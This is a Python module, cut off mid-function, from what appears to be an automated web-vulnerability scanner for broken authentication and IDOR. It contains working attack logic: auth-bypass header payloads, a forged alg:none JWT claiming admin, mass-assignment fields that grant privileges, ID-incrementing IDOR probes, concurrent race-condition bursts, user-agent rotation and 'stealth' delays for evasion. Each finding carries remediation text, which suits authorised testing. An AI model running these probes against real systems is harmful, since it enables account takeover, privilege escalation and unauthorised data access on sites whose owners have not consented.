# modules/broken_auth_idor.py
from __future__ import annotations

import asyncio
import json
import random
import re
import secrets
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

import httpx
from pydantic import BaseModel, ConfigDict, Field, field_validator

from config.settings import OUTPUT_DIR, HTTP_TIMEOUT, HTTP_VERIFY_SSL, MAX_THREADS
from core.logger import get_logger, section
from core.sanitize import safe_filename as _sanitize_filename
from modules.host_probe import ProbeResult
from modules.js_analyzer import JSAnalysisResult
from modules.param_discovery import ParamScanResult

log = get_logger()

OUTPUT_PATH = Path(OUTPUT_DIR) / "auth_idor"

# CONSTANTS
DEFAULT_TIMEOUT: float = float(HTTP_TIMEOUT)
MAX_CONCURRENT: int = min(MAX_THREADS, 20)
MAX_TARGET_QUEUE: int = 200
RESPONSE_PREVIEW: int = 400
STEALTH_MIN_DELAY: float = 0.2
STEALTH_MAX_DELAY: float = 1.2

# Race condition: fire this many concurrent requests to same endpoint
RACE_CONCURRENCY: int = 15
RACE_ENDPOINTS_MAX: int = 5    # Only test top N endpoints for race

# Structural similarity threshold for IDOR confirmation
# Two responses with >85% tag bigram overlap = same page structure = false positive
STRUCTURE_SIMILARITY_THRESHOLD: float = 0.85
_AUTH_PROTECTED_STATUSES: tuple[int, ...] = (401, 403, 301, 302, 303, 307, 308)

_USER_AGENTS: tuple[str, ...] = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
)

# Auth bypass header payloads
_AUTH_BYPASS_HEADERS: tuple[dict[str, str], ...] = (
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"Authorization": "null"},
    {"Authorization": "undefined"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Original-Method": "GET"},
)

# JWT with alg:none — header.payload. (empty signature)
# header: {"alg":"none","typ":"JWT"}
# payload: {"sub":"1","name":"admin","role":"admin","iat":1516239022}
_JWT_NONE_TOKEN: str = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
    ".eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ"
    "."
)

# Mass assignment probe fields — sent as extra POST/PUT body fields
_MASS_ASSIGN_FIELDS: tuple[dict[str, Any], ...] = (
    {"role": "admin"},
    {"is_admin": True},
    {"admin": True},
    {"privilege": "admin"},
    {"user_type": "superuser"},
    {"permissions": ["admin", "write", "delete"]},
    {"group": "admin"},
    {"access_level": 99},
)

# Static admin/auth paths to probe on every live host
_STATIC_PROBE_PATHS: tuple[str, ...] = (
    "/admin",
    "/admin/users",
    "/admin/dashboard",
    "/api/admin",
    "/api/v1/admin",
    "/api/v1/users",
    "/api/v1/me",
    "/api/users",
    "/profile",
    "/account",
    "/account/settings",
    "/dashboard",
    "/manage",
    "/internal",
    "/internal/admin",
    "/.well-known/security.txt",
)

_ADMIN_KEYWORDS: frozenset[str] = frozenset({
    "admin", "manage", "delete", "config", "settings",
    "superuser", "root", "dashboard", "internal",
})
_AUTH_KEYWORDS: frozenset[str] = frozenset({
    "login", "signin", "auth", "oauth", "token",
    "session", "jwt", "bearer", "api",
})

_SESSION_EXPOSURE_PATTERNS: tuple[re.Pattern, ...] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r'"user(?:name|_?id|_?email)"\s*:\s*"[^"]+"',
        r'"role"\s*:\s*"(?:admin|superuser|root|owner)"',
        r'"(?:access|auth|api)_?token"\s*:\s*"[A-Za-z0-9._\-]+"',
        r'"(?:password|passwd|secret|private_key)"\s*:',
        r'<(?:h[1-6]|title)[^>]*>[^<]*(?:dashboard|admin\s+panel|account)',
        r'"is_admin"\s*:\s*true',
        r'"permissions"\s*:\s*\[',
    )
)

# Patterns that identify IDOR-testable URLs
_IDOR_PATTERNS: tuple[re.Pattern, ...] = (
    re.compile(r"(?:user|account|profile|item|order|doc(?:ument)?|object)s?[=/]([0-9a-f\-]{2,})", re.I),
    re.compile(r"[?&][^&]*(?:_?id|_?uid|_?pid)[^&]*=([0-9]{1,12})", re.I),
    re.compile(r"/(\d{1,12})(?:/|$|\?)", re.I),
    re.compile(
        r"/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$|\?)",
        re.I,
    ),
)

_NUMERIC_PATH_RE: re.Pattern = re.compile(r"/(\d{1,12})(?=/|$|\?)")
_UUID_PATH_RE: re.Pattern = re.compile(
    r"/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?=/|$|\?)",
    re.I,
)


# ENUMERATIONS
class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class FindingType(str, Enum):
    IDOR_HORIZONTAL = "idor_horizontal"
    IDOR_VERTICAL = "idor_vertical"
    AUTH_BYPASS = "auth_bypass"
    JWT_NONE = "jwt_none"
    SESSION_EXPOSURE = "session_exposure"
    MASS_ASSIGNMENT = "mass_assignment"
    RACE_CONDITION = "race_condition"
    PRIV_ESCALATION = "privilege_escalation_chain"


# DATA MODELS

class AuthFinding(BaseModel):
    model_config = ConfigDict(use_enum_values=True)

    id: str = Field(default_factory=lambda: secrets.token_hex(8))
    target: str
    url: str
    finding_type: FindingType
    severity: Severity
    title: str
    description: str
    evidence: dict[str, Any] = Field(default_factory=dict)
    remediation: str
    confidence: float = Field(ge=0.0, le=1.0, default=0.9)
    chain_id: str | None = None

    @field_validator("confidence")
    @classmethod
    def _round(cls, v: float) -> float:
        return round(v, 2)


@dataclass(slots=True)
class AuthScanResult:
    target: str
    findings: list[AuthFinding] = field(default_factory=list)
    tested_endpoints: int = 0
    chain_opportunities: list[dict[str, Any]] = field(default_factory=list)

    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == Severity.CRITICAL.value)

    @property
    def confirmed_count(self) -> int:
        return len(self.findings)

    def to_dict(self) -> dict[str, Any]:
        return {
            "target": self.target,
            "findings": [f.model_dump() for f in self.findings],
            "summary": {
                "tested": self.tested_endpoints,
                "confirmed": self.confirmed_count,
                "critical": self.critical_count,
                "chains": len(self.chain_opportunities),
            },
        }


# STRUCTURAL SIMILARITY
def _tag_bigrams(html: str) -> set[tuple[str, str]]:
    """
    Extracts ordered HTML tag bigrams from response body.
    Used for structural comparison — immune to dynamic content changes
    (timestamps, CSRF tokens, session values, user names).
    """
    tags = re.findall(r"</?(\w+)", html)
    return {(tags[i], tags[i + 1]) for i in range(len(tags) - 1)}


def _structural_similarity(a: str, b: str) -> float:
    """
    Jaccard similarity on HTML tag bigrams.
    Returns 0.0 (completely different) to 1.0 (identical structure).
    Falls back to length ratio for non-HTML responses.
    """
    if not a or not b:
        return 1.0 if a == b else 0.0

    if "<" not in a or "<" not in b:
        max_len = max(len(a), len(b))
        return 1.0 - abs(len(a) - len(b)) / max_len if max_len else 1.0

    bg_a = _tag_bigrams(a)
    bg_b = _tag_bigrams(b)
    if not bg_a and not bg_b:
        return 1.0
    union = bg_a | bg_b
    return len(bg_a & bg_b) / len(union) if union else 1.0


# URL UTILITIES
def _has_idor_pattern(url: str) -> bool:
    return any(pat.search(url) for pat in _IDOR_PATTERNS)


def _mutate_id(url: str) -> tuple[str, str] | None:
    """
    Returns (original_id, mutated_url).
    Tries numeric path segment, then UUID path segment, then query param.
    Never wraps around — skips on overflow.
    """
    # Numeric path segment
    match = _NUMERIC_PATH_RE.search(url)
    if match:
        original = match.group(1)
        idx = match.start(1)
        end = match.end(1)
        mutated = str(int(original) + 1)
        return original, url[:idx] + mutated + url[end:]

    # UUID path segment — increment last 4 hex chars
    match = _UUID_PATH_RE.search(url)
    if match:
        original = match.group(1)
        prefix = original[:-4]
        last = original[-4:]
        try:
            val = int(last, 16)
            if val >= 0xFFFF:
                return None
            mutated = prefix + format(val + 1, "04x")
            return original, url.replace(original, mutated, 1)
        except ValueError:
            return None

    # Query parameter
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    for key, vals in qs.items():
        if "id" in key.lower() and vals and vals[0].isdigit():
            original = vals[0]
            qs[key] = [str(int(original) + 1)]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            return original, parsed._replace(query=new_query).geturl()

    return None


def _safe_join(base: str, path: str) -> str:
    """
    Joins base URL with path.
    If path is already absolute (http/https), returns it unchanged.
    If path starts with /, replaces only the path component of base.
    """
    if not path:
        return base
    if path.startswith(("http://", "https://")):
        return path
    if path.startswith("/"):
        parsed = urllib.parse.urlparse(base)
        return f"{parsed.scheme}://{parsed.netloc}{path}"
    return urllib.parse.urljoin(base, path)


def _host_base_url(host: Any) -> str:
    """Converts a HostRecord (or string) to a base URL."""
    if isinstance(host, str):
        return host if host.startswith("http") else f"https://{host}"
    hostname: str = (
        getattr(host, "hostname", None)
        or getattr(host, "host", None)
        or str(host)
    )
    scheme: str = getattr(host, "scheme", "https")
    port: int | None = getattr(host, "port", None)
    if port and port not in (80, 443):
        return f"{scheme}://{hostname}:{port}"
    return f"{scheme}://{hostname}"


def _get_cookies(resp: httpx.Response) -> dict[str, str]:
    """Extracts cookies from response into a clean name→value dict."""
    cookies: dict[str, str] = {}
    for cookie_str in resp.headers.get_list("set-cookie"):
        part = cookie_str.split(";")[0].strip()
        if "=" in part:
            name, _, value = part.partition("=")
            cookies[name.strip()] = value.strip()
    return cookies


def _safe_filename(value: str) -> str:
    """Sanitize user-controlled strings to a filesystem-safe filename."""
    return _sanitize_filename(value)


def _parse_json(text: str) -> Any | None:
    try:
        return json.loads(text)
    except (TypeError, ValueError):
        return None


def _json_contains_pair(obj: Any, key: str, value: Any) -> bool:
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == key and v == value:
                return True
            if _json_contains_pair(v, key, value):
                return True
        return False
    if isinstance(obj, list):
        return any(_json_contains_pair(item, key, value) for item in obj)
    return False


def _response_body_differs(baseline: httpx.Response, resp: httpx.Response) -> bool:
    base_text = baseline.text or ""
    resp_text = resp.text or ""
    if base_text.strip() == resp_text.strip():
        return False

    base_json = _parse_json(base_text)
    resp_json = _parse_json(resp_text)
    if base_json is not None and resp_json is not None:
        return base_json != resp_json

    return _structural_similarity(base_text, resp_text) < STRUCTURE_SIMILARITY_THRESHOLD


# HTTP HELPER
async def _get(
    client: httpx.AsyncClient,
    url: str,
    extra_headers: dict[str, str] | None = None,
    follow_redirects: bool = True,
    stealth: bool = False,
) -> httpx.Response | None:
    """
    GET request with random UA, optional extra headers, optional stealth delay.
    Returns None on any network/timeout error.
    """
    if stealth:
        await asyncio.sleep(random.uniform(STEALTH_MIN_DELAY, STEALTH_MAX_DELAY))  # noqa: S311

    headers: dict[str, str] = {
        "User-Agent": secrets.choice(_USER_AGENTS),
        **(extra_headers or {}),
    }
    try:
        return await client.get(
            url, headers=headers, follow_redirects=follow_redirects
        )
    except httpx.TimeoutException:
        log.debug(f"[Auth] Timeout: {url}")
    except httpx.RequestError as exc:
        log.debug(f"[Auth] Error: {url} — {exc}")
    return None


async def _post(
    client: httpx.AsyncClient,
    url: str,
    data: dict[str, Any] | None = None,
    json_body: dict[str, Any] | None = None,
    extra_headers: dict[str, str] | None = None,
    stealth: bool = False,
) -> httpx.Response | None:
    """POST with form data or JSON body."""
    if stealth:
        await asyncio.sleep(random.uniform(STEALTH_MIN_DELAY, STEALTH_MAX_DELAY))  # noqa: S311

    headers: dict[str, str] = {
        "User-Agent": secrets.choice(_USER_AGENTS),
        **(extra_headers or {}),
    }
    try:
        if json_body is not None:
            return await client.post(url, json=json_body, headers=headers)
        return await client.post(url, data=data or {}, headers=headers)
    except (httpx.TimeoutException, httpx.RequestError) as exc:
        log.debug(f"[Auth] POST error: {url} — {exc}")
    return None


# IDOR SCANNER

class IDORScanner:
    """
    Horizontal and vertical IDOR detection.

    Horizontal: Increments object ID in URL. Confirms IDOR only when:
      - Both responses are 2xx
      - Structural similarity < threshold (different content, not just dynamic tokens)
      - Response bodies are not identical (not same user data)

    Vertical: Probes admin-path URLs with no auth headers.
    Confirms only when response body contains admin-domain keywords.
    """

    def __init__(
        self,
        target: str,
        sem:    asyncio.Semaphore,
        stealth: bool = False,
    ) -> None:
        self._target  = target
        self._sem     = sem
        self._stealth = stealth

    async def scan(
        self,
        client: httpx.AsyncClient,
        urls:   list[str],
    ) -> list[AuthFinding]:
        tasks = [
            asyncio.create_task(self._probe(client, url))
            for url in urls
        ]
        batches: list[list[AuthFinding]] = await asyncio.gather(*tasks)
        return [f for batch in batches for f in batch]

    async def _probe(
        self,
        client: httpx.AsyncClient,
        url:    str,
    ) -> list[AuthFinding]:
        findings: list[AuthFinding] = []
        h = await self._horizontal(client, url)
        if h:
            findings.append(h)
        v = await self._vertical(client, url)
        if v:
            findings.append(v)
        return findings

    async def _horizontal(
        self,
        client: httpx.AsyncClient,
        url:    str,
    ) -> AuthFinding | None:
        if not _has_idor_pattern(url):
            return None
        mutation = _mutate_id(url)
        if mutation is None:
            return None
        original_id, test_url = mutation

        async with self._sem:
            baseline = await _get(client, url, stealth=self._stealth)
        if not baseline or not (200 <= baseline.status_code < 300):
            return None

        async with self._sem:
            resp = await _get(client, test_url, stealth=self._stealth)
        if not resp or not (200 <= resp.status_code < 300):
            return None

        # Structural similarity check — immune to dynamic content
        similarity = _structural_similarity(baseline.text, resp.text)

        # Identical body = same resource (e.g. public endpoint returning same data)
        if resp.text.strip() == baseline.text.strip():
            return None

        # Too similar structurally = likely same page with different tokens
        if similarity > STRUCTURE_SIMILARITY_THRESHOLD:
            return None

        # Different structure = different resource accessed = IDOR confirmed
        log.warning(
            f"[IDOR] ★ HORIZONTAL [{test_url}] "
            f"similarity={similarity:.2f} original_id={original_id}"
        )
        return AuthFinding(
            target=self._target,
            url=test_url,
            finding_type=FindingType.IDOR_HORIZONTAL,
            severity=Severity.HIGH,
            title="Horizontal IDOR — Unauthorized Resource Access via ID Manipulation",
            description=(
                f"Incrementing resource ID `{original_id}` returned a structurally "
                f"different valid response (HTTP {resp.status_code}, "
                f"similarity={similarity:.0%}). "
                "Server does not enforce ownership on object access."
            ),
            evidence={
                "original_id":   original_id,
                "tested_url":    test_url,
                "baseline_status": baseline.status_code,
                "test_status":   resp.status_code,
                "similarity":    round(similarity, 3),
                "body_snippet":  resp.text[:RESPONSE_PREVIEW],
            },
            remediation=(
                "Implement server-side ownership validation on every resource request. "
                "Verify authenticated user owns or has explicit access to the requested object. "
                "Never rely on sequential/predictable IDs — use UUIDs with ACL checks."
            ),
            confidence=0.87,
        )

    async def _vertical(
        self,
        client: httpx.AsyncClient,
        url:    str,
    ) -> AuthFinding | None:
        if not any(kw in url.lower() for kw in _ADMIN_KEYWORDS):
            return None

        # Send request with NO auth headers — not empty string, absent
        async with self._sem:
            resp = await _get(
                client,
                url,
                extra_headers={},    # No Cookie, no Authorization
                follow_redirects=False,
                stealth=self._stealth,
            )
        if not resp or resp.status_code != 200:
            return None

        body_lower = resp.text.lower()
        # Require admin keywords in body — not just URL — reduces false positives
        admin_hits = [kw for kw in _ADMIN_KEYWORDS if kw in body_lower]
        if not admin_hits:
            return None

        log.warning(f"[IDOR] ★ VERTICAL — Admin endpoint accessible: {url}")
        return AuthFinding(
            target=self._target,
            url=url,
            finding_type=FindingType.IDOR_VERTICAL,
            severity=Severity.CRITICAL,
            title="Vertical IDOR — Admin Endpoint Accessible Without Authentication",
            description=(
                f"Unauthenticated GET to `{url}` returned HTTP 200 "
                f"with admin content (keywords: {', '.join(admin_hits)})."
            ),
            evidence={
                "status_code": resp.status_code,
                "admin_keywords_found": admin_hits,
                "snippet": resp.text[:RESPONSE_PREVIEW],
            },
            remediation=(
                "Enforce RBAC on all admin endpoints. "
                "Return 401 for unauthenticated and 403 for unauthorized requests. "
                "Never rely on URL obscurity for access control."
            ),
            confidence=0.93,
        )


# RACE CONDITION SCANNER

class RaceConditionScanner:
    """
    Fires RACE_CONCURRENCY simultaneous requests to state-mutating endpoints.
    Detects race conditions via response divergence in the concurrent burst.

    Targets: POST endpoints with auth/account/order keywords.
    Signal: Multiple concurrent requests return different status codes or
            response bodies where only one should succeed (e.g. double-spend).
    """

    def __init__(
        self,
        target: str,
        stealth: bool = False,
    ) -> None:
        self._target = target
        self._stealth = stealth

    async def scan(
        self,
        client: httpx.AsyncClient,
        urls: list[str],
    ) -> list[AuthFinding]:
        # Only test endpoints likely to have state mutations
        race_candidates = [
            url for url in urls
            if any(kw in url.lower() for kw in (
                "order", "purchase", "buy", "redeem", "coupon",
                "transfer", "withdraw", "vote", "submit", "register",
            ))
        ][:RACE_ENDPOINTS_MAX]

        if not race_candidates:
            return []

        tasks = [
            asyncio.create_task(self._probe(client, url))
            for url in race_candidates
        ]
        batches: list[AuthFinding | None] = await asyncio.gather(*tasks)
        return [f for f in batches if f is not None]

    async def _probe(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> AuthFinding | None:
        """
        Fires RACE_CONCURRENCY concurrent POST requests simultaneously.
        Uses asyncio.gather with no semaphore — intentional, this is the attack.
        Detects divergence: if responses differ, race condition likely exists.
        """
        # Fire all requests simultaneously — no semaphore intentional here
        responses: list[httpx.Response | None] = await asyncio.gather(
            *[_post(client, url, data={}, stealth=False) for _ in range(RACE_CONCURRENCY)],
            return_exceptions=False,
        )

        valid = [r for r in responses if r is not None]
        if len(valid) < 3:
            return None

        status_codes = [r.status_code for r in valid]
        unique_codes = set(status_codes)

        # Race signal: mixed success/failure responses on identical concurrent requests
        has_mix = len(unique_codes) > 1
        has_2xx = any(200 <= c < 300 for c in status_codes)
        has_4xx = any(400 <= c < 500 for c in status_codes)
        success_count = sum(1 for c in status_codes if 200 <= c < 300)

        # More than one success on what should be a single-use action = race
        if not (has_mix and has_2xx and has_4xx) and success_count <= 1:
            return None

        log.warning(
            f"[Race] ★ PROBABLE RACE CONDITION — {url}\n"
            f"       {RACE_CONCURRENCY} concurrent requests → {dict.fromkeys(status_codes, None)}"
        )
        return AuthFinding(
            target=self._target,
            url=url,
            finding_type=FindingType.RACE_CONDITION,
            severity=Severity.HIGH,
            title="Race Condition — Concurrent Request State Divergence",
            description=(
                f"Firing {RACE_CONCURRENCY} simultaneous requests to `{url}` produced "
                f"divergent responses: {sorted(unique_codes)}. "
                f"{success_count}/{RACE_CONCURRENCY} requests succeeded. "
                "Indicates missing atomic transaction control."
            ),
            evidence={
                "concurrent_requests": RACE_CONCURRENCY,
                "status_distribution": {str(c): status_codes.count(c) for c in unique_codes},
                "success_count": success_count,
            },
            remediation=(
                "Wrap state-mutating operations in database transactions with SELECT FOR UPDATE. "
                "Use idempotency keys on financial/state operations. "
                "Implement server-side request deduplication."
            ),
            confidence=0.72,
        )


# AUTH SCANNER
class AuthScanner:
    """
    Auth bypass, JWT alg:none, session exposure, and mass assignment detection.
    """

    def __init__(
        self,
        target: str,
        sem: asyncio.Semaphore,
        stealth: bool = False,
    ) -> None:
        self._target = target
        self._sem = sem
        self._stealth = stealth

    async def scan(
        self,
        client: httpx.AsyncClient,
        urls: list[str],
    ) -> list[AuthFinding]:
        tasks = [
            asyncio.create_task(self._probe(client, url))
            for url in urls
        ]
        batches: list[list[AuthFinding]] = await asyncio.gather(*tasks)
        return [f for batch in batches for f in batch]

    async def _probe(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> list[AuthFinding]:
        findings: list[AuthFinding] = []

        bypass = await self._auth_bypass(client, url)
        findings.extend(bypass)

        jwt = await self._jwt_none(client, url)
        if jwt:
            findings.append(jwt)

        session = await self._session_exposure(client, url)
        if session:
            findings.append(session)

        mass = await self._mass_assignment(client, url)
        if mass:
            findings.append(mass)

        return findings

    async def _auth_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> list[AuthFinding]:
        """
        Tests auth bypass headers concurrently after confirming baseline is 401/403.
        All bypass headers fired in parallel — much faster than sequential.
        """
        async with self._sem:
            baseline = await _get(
                client, url, follow_redirects=False, stealth=self._stealth
            )
        if not baseline or baseline.status_code not in _AUTH_PROTECTED_STATUSES:
            return []

        # Fire all bypass headers concurrently
        async def _get_with_sem(headers: dict[str, str]) -> httpx.Response | None:
            async with self._sem:
                return await _get(
                    client,
                    url,
                    extra_headers=headers,
                    follow_redirects=False,
                    stealth=self._stealth,
                )

        bypass_tasks = [
            _get_with_sem(headers)
            for headers in _AUTH_BYPASS_HEADERS
        ]
        responses: list[httpx.Response | None] = await asyncio.gather(*bypass_tasks)

        findings: list[AuthFinding] = []
        for headers, resp in zip(_AUTH_BYPASS_HEADERS, responses):
            if resp and resp.status_code == 200:
                if baseline and not _response_body_differs(baseline, resp):
                    continue
                header_key = next(iter(headers))
                log.warning(
                    f"[Auth] ★ BYPASS [{url}] via {header_key}: {headers[header_key]}"
                )
                findings.append(AuthFinding(
                    target=self._target,
                    url=url,
                    finding_type=FindingType.AUTH_BYPASS,
                    severity=Severity.CRITICAL,
                    title=f"Authentication Bypass via {header_key}",
                    description=(
                        f"Injecting `{header_key}: {headers[header_key]}` bypassed "
                        f"HTTP {baseline.status_code} restriction → HTTP 200."
                    ),
                    evidence={
                        "bypass_header": headers,
                        "baseline_status": baseline.status_code,
                        "bypass_status": resp.status_code,
                        "body_snippet": resp.text[:RESPONSE_PREVIEW],
                    },
                    remediation=(
                        "Never trust client-supplied headers for access control decisions. "
                        "Validate authentication server-side on every request regardless of "
                        "proxy/forwarding headers."
                    ),
                    confidence=0.98,
                ))
        return findings

    async def _jwt_none(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> AuthFinding | None:
        """
        Tests JWT alg:none on ANY endpoint — not just auth-keyword URLs.
        Many API endpoints accept Bearer tokens; all should be tested.
        """
        async with self._sem:
            baseline = await _get(
                client,
                url,
                follow_redirects=False,
                stealth=self._stealth,
            )
        async with self._sem:
            resp = await _get(
                client,
                url,
                extra_headers={"Authorization": f"Bearer {_JWT_NONE_TOKEN}"},
                follow_redirects=False,
                stealth=self._stealth,
            )
        if not resp or resp.status_code != 200:
            return None

        if baseline and not _response_body_differs(baseline, resp):
            return None

        # Verify response actually contains user data — not just a public 200
        body = resp.text
        has_user_data = any(
            kw in body.lower()
            for kw in ("admin", "user", "email", "role", "token", "session")
        )
        if not has_user_data:
            return None

        log.warning(f"[Auth] ★ JWT NONE ACCEPTED — {url}")
        return AuthFinding(
            target=self._target,
            url=url,
            finding_type=FindingType.JWT_NONE,
            severity=Severity.CRITICAL,
            title="JWT 'alg:none' Accepted — Signature Bypass",
            description=(
                "Server accepted an unsigned JWT (alg:none) and returned "
                "user-context data. Attacker can forge any identity claim."
            ),
            evidence={
                "token_header": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
                "status_code": resp.status_code,
                "body_snippet": body[:RESPONSE_PREVIEW],
            },
            remediation=(
                "Reject any JWT with alg:none unconditionally in your JWT library. "
                "Enforce RS256 or ES256 with explicit algorithm allowlist. "
                "Never rely on the 'alg' field in the token header to select the algorithm."
            ),
            confidence=0.97,
        )

    async def _session_exposure(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> AuthFinding | None:
        """
        Detects session token leaks via login → authenticated request chain.
        Tests /api/me, /profile, /account — not just hardcoded /profile.
        """
        if not any(kw in url.lower() for kw in _AUTH_KEYWORDS):
            return None

        async with self._sem:
            login_resp = await _get(client, url, stealth=self._stealth)
        if not login_resp:
            return None

        cookies = _get_cookies(login_resp)
        if not cookies:
            return None

        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items())

        # Try multiple profile/identity endpoints
        profile_paths = ("/api/me", "/api/v1/me", "/profile", "/account", "/user/profile")
        base = _safe_join(url, "/")

        for path in profile_paths:
            probe_url = _safe_join(base, path)
            async with self._sem:
                baseline = await _get(
                    client,
                    probe_url,
                    follow_redirects=False,
                    stealth=self._stealth,
                )
            async with self._sem:
                resp = await _get(
                    client,
                    probe_url,
                    extra_headers={"Cookie": cookie_header},
                    follow_redirects=False,
                    stealth=self._stealth,
                )
            if not resp or resp.status_code != 200:
                continue

            if baseline and baseline.status_code == 200:
                if not _response_body_differs(baseline, resp):
                    continue

            if not any(p.search(resp.text[:4096]) for p in _SESSION_EXPOSURE_PATTERNS):
                continue

            log.warning(f"[Auth] ★ SESSION EXPOSURE — {url} → {probe_url}")
            return AuthFinding(
                target=self._target,
                url=probe_url,
                finding_type=FindingType.SESSION_EXPOSURE,
                severity=Severity.MEDIUM,
                title="Session Cookie Exposes Sensitive User Data",
                description=(
                    f"Session cookie obtained from `{url}` grants access to sensitive "
                    f"user data at `{probe_url}`."
                ),
                evidence={
                    "cookie_names": list(cookies.keys()),
                    "profile_status": resp.status_code,
                    "body_snippet": resp.text[:RESPONSE_PREVIEW],
                },
                remediation=(
                    "Bind sessions to IP and User-Agent fingerprint. "
                    "Regenerate session ID on privilege change. "
                    "Scope sensitive profile data to authenticated+authorised sessions only. "
                    "Set Secure, HttpOnly, SameSite=Strict on session cookies."
                ),
                confidence=0.81,
            )

        return None

    async def _mass_assignment(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> AuthFinding | None:
        """
        Probes registration/profile update endpoints for mass assignment.
        Sends extra privileged fields (role=admin, is_admin=true, etc.)
        Confirms if response reflects elevated privilege in body.
        """
        target_keywords = ("register", "signup", "profile", "update", "settings", "user")
        if not any(kw in url.lower() for kw in target_keywords):
            return None

        for extra_fields in _MASS_ASSIGN_FIELDS:
            # Try JSON body first (most modern APIs)
            async with self._sem:
                resp = await _post(
                    client,
                    url,
                    json_body={
                        "username": f"phantom_{secrets.token_hex(4)}",
                        "email": f"phantom_{secrets.token_hex(4)}@test.com",
                        "password": "TestPassword123!",
                        **extra_fields,
                    },
                    stealth=self._stealth,
                )
            if not resp:
                continue

            # Confirmation: response reflects elevated role/privilege
            field_key = next(iter(extra_fields))
            field_val = next(iter(extra_fields.values()))
            resp_json = _parse_json(resp.text)

            has_elevation = False
            if resp.status_code in (200, 201):
                if resp_json is not None:
                    has_elevation = _json_contains_pair(resp_json, field_key, field_val)
                else:
                    has_elevation = str(field_val).lower() in resp.text.lower()

            if has_elevation:
                log.warning(f"[Auth] ★ MASS ASSIGNMENT — {url} accepted {extra_fields}")
                return AuthFinding(
                    target=self._target,
                    url=url,
                    finding_type=FindingType.MASS_ASSIGNMENT,
                    severity=Severity.CRITICAL,
                    title=f"Mass Assignment — Privileged Field '{field_key}' Accepted",
                    description=(
                        f"POST to `{url}` with `{extra_fields}` returned HTTP {resp.status_code} "
                        f"and reflected the privileged value in the response body. "
                        "Server does not filter user-supplied fields on object binding."
                    ),
                    evidence={
                        "injected_fields": extra_fields,
                        "status_code":     resp.status_code,
                        "body_snippet":    resp.text[:RESPONSE_PREVIEW],
                    },
                    remediation=(
                        "Use explicit field allowlists (not blocklists) on every model binding. "
                        "Never bind raw request body to model objects directly. "
                        "Validate and explicitly assign only expected fields."
                    ),
                    confidence=0.91,
                )

        return None

# CHAIN BUILDER
def _build_chains(
    findings: list[AuthFinding],
) -> tuple[list[dict[str, Any]], dict[str, str]]:
    """
    Identifies attack chains across findings.
    Current chains:
    - AuthBypass + IDOR → Privilege Escalation
    - JWT None + SessionExposure → Full Account Takeover
    - MassAssignment + AuthBypass → Admin Access Chain
    """
    chains: list[dict[str, Any]] = []
    chain_map: dict[str, str] = {}
    type_map: dict[str, list[AuthFinding]] = {}
    for f in findings:
        # use_enum_values=True means f.finding_type is str at runtime;
        # static type checker sees FindingType — suppress false positive
        type_map.setdefault(f.finding_type, []).append(f)  # type: ignore[arg-type]

    bypass_list = type_map.get(FindingType.AUTH_BYPASS.value, [])
    idor_list = type_map.get(FindingType.IDOR_HORIZONTAL.value, [])
    idor_v_list = type_map.get(FindingType.IDOR_VERTICAL.value, [])
    jwt_list = type_map.get(FindingType.JWT_NONE.value, [])
    session_list = type_map.get(FindingType.SESSION_EXPOSURE.value, [])
    mass_list = type_map.get(FindingType.MASS_ASSIGNMENT.value, [])

    # Chain 1: Auth Bypass + any IDOR → Privilege Escalation
    for bypass in bypass_list:
        for idor in idor_list + idor_v_list:
            chain_id = secrets.token_hex(6)
            chain_map[bypass.id] = chain_id
            chain_map[idor.id] = chain_id
            chains.append({
                "chain_id": chain_id,
                "type": FindingType.PRIV_ESCALATION.value,
                "severity": Severity.CRITICAL.value,
                "finding_ids": [bypass.id, idor.id],
                "steps": [
                    f"1. Bypass authentication at {bypass.url} via {bypass.title}",
                    f"2. Access restricted resource via IDOR at {idor.url}",
                    "3. Full unauthorized data access achieved",
                ],
                "impact": "Authentication bypass combined with IDOR enables complete unauthorized access to any user resource.",
            })

    # Chain 2: JWT None + Session Exposure → Account Takeover
    for jwt in jwt_list:
        for session in session_list:
            chain_id = secrets.token_hex(6)
            chain_map[jwt.id] = chain_id
            chain_map[session.id] = chain_id
            chains.append({
                "chain_id": chain_id,
                "type": "account_takeover_chain",
                "severity": Severity.CRITICAL.value,
                "finding_ids": [jwt.id, session.id],
                "steps": [
